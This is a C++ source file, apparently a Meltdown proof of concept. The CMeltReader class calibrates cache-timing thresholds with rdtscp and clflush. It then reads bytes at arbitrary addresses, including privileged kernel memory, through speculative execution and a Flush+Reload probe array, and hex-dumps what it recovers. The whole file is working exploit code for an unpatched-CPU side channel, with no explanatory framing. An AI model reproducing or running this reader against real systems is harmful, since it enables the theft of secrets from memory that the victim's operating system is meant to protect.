#include <stdio.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sched.h>
#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <vector>
#include <algorithm>

#include "meltreader.hpp"

#define PAGE_BITS 12

CMeltReader::CMeltReader()
{
	m_probe_array = (char*) mmap(0, 256<<PAGE_BITS, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0);
	find_cache_hit_threshold();
}

CMeltReader::~CMeltReader()
{
	munmap(m_probe_array, 256<<PAGE_BITS);
}

static __inline int64_t get_access_time(volatile char *addr)
{
	uint32_t time1, time1h;
	uint32_t time2, time2h;
	__asm__ __volatile__ ("rdtscp" : "=a"(time1),"=d"(time1h)::"%rcx");
	__asm__ __volatile__ ("movb 0(%0), %%cl" :: "r"(addr) :"%rcx");
	__asm__ __volatile__ ("rdtscp" : "=a"(time2),"=d"(time2h)::"%rcx");
	return ((int64_t)time2h<<32) + time2 - ((int64_t)time1h<<32) - time1;
}

static int mysqrt(long val)
{
	long root = val / 2, prevroot = 0, i = 0;
	while (prevroot != root && i++ < 100) {
		prevroot = root;
		root = (val / root + root) / 2;
	}
	return (int)root;
}

#define flushpos(addr) __asm__ __volatile__("mfence\n" "clflush 0(%0)\n" :: "r"(addr));

#define ESTIMATE_CYCLES 20
void CMeltReader::find_cache_hit_threshold()
{
	int64_t cached=0x7fffffff, uncached=0x7fffffff, i;
	char * target_array = m_probe_array;
	volatile int v;
	std::vector<int64_t> uns;
	
	sched_yield();
	for (i = 0; i < ESTIMATE_CYCLES; i++)
	{
		v = *(volatile int*)target_array;
		cached = std::min<int64_t>(cached, get_access_time(target_array));
	}
	
	for (i = 0; i < ESTIMATE_CYCLES*3; i++) {
		flushpos(target_array);
		int64_t t = get_access_time(target_array);
		uns.push_back(t);
	}
	std::sort(uns.begin(), uns.end());
	uncached = uns[ESTIMATE_CYCLES];
	
	m_th1 = (int)mysqrt(cached*uncached);
	m_th2 = uncached*2;
	
	fprintf(stderr, "cached = %lld, uncached = %lld, threshold %ld\n",
		   cached, uncached, m_th1);
}

int CMeltReader::read_byte(uintptr_t addr, void (*loader)())
{
	char * p_array = m_probe_array;
	int times[256];
	const int num_probes = 256;
	int i,c, ch=0, mcnt=0;

#define S_4(S) S S S S
#define S_16(S) S_4(S) S_4(S) S_4(S) S_4(S)
#define S_64(S) S_16(S) S_16(S) S_16(S) S_16(S)
#define S_256(S) S_64(S) S_64(S) S_64(S) S_64(S)
	
	for (c = 0; c < num_probes; c++)
	{
		mcnt = 0;
		memset(times, 0, sizeof(times));
		
		for (i=0; i<256; i++) {
			flushpos(p_array + (i<<PAGE_BITS));
		}
		if (loader) (*loader)();
		asm __volatile__ (
				"xorq %%rax, %%rax                \n"
				S_256("add $0x141, %%rcx\n")
				"movb (%[ptr]), %%al              \n"
				"shlq $0xc, %%rax                 \n"
				"movq (%[buf], %%rax, 1), %%rbx   \n"
				"nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
				"nop\nnop\nnop\nnop\nnop\nnop\nnop\nnop\n"
				::  [ptr] "r" (addr), [buf] "r" (p_array)
				: "%rax", "%rbx", "%rcx"
						  );
		
		for (i=0; i<256; i++) {
			times[i] = get_access_time(&p_array[i<<PAGE_BITS]);
		}
		
		for (i=0; i<256; i++) {
			//printf("%02x %c: %d\n", i, isprint(i)?i:' ', times[i]);
			if (times[i] < m_th1)
			{
				++ mcnt;
				ch = i;
			}
		}
		if (mcnt == 1) return ch;
		if (mcnt > 1)
		{
			//fprintf(stderr, "multi cached?\n");
			sched_yield();
			continue;
		}
		for (i=0; i<256; i++) {
			if (times[i] > m_th2)
			{
				//lost CPU?
				-- c;
				break;
			}
		}
	}
	return -1;
}

void CMeltReader::dump_hex(uintptr_t pos, const void * buf, size_t len, FILE * fp)
{
	if (!buf || !len) return;
	
	const char * hextbl = "0123456789abcdef";
	char cbuf[120];
	
	for (size_t i=0; i<len; i+=16)
	{
		const char * ptr = (const char *)buf + i;
		uintptr_t addr = pos + i;
		size_t l = len-i; if (l>16) l = 16;
		char * os = cbuf;
		int aw = sizeof(void*)+4;
		
		for (int j=0; j<aw; ++j)
		{
			int o = 4 * (aw - j - 1);
			*os++ = hextbl[0xf & (addr>>o)];
		}
		*os++ = ':';
		*os++ = ' ';
		*os++ = ' ';
		
		for (uint32_t i=0; i<16; ++i)
		{
			if (i<l)
			{
				*os++ = hextbl[0xf&(ptr[i]>>4)];
				*os++ = hextbl[0xf&(ptr[i])];
				*os++ = (i==7&&l>8) ? '-' : ' ';
			}
			else
			{
				*os ++ = ' ';
				*os ++ = ' ';
				*os ++ = ' ';
			}
		}
		*os++ = ' ';
		*os++ = ' ';
		*os++ = ' ';
		
		for (uint32_t i=0; i<l; ++i)
		{
			unsigned char ch = ptr[i];
			*os++ = isprint(ch) ? ch : '.';
		}
		*os ++ = '\n';
		*os = 0;
		fwrite(cbuf, 1, os-cbuf, fp);
	}
}
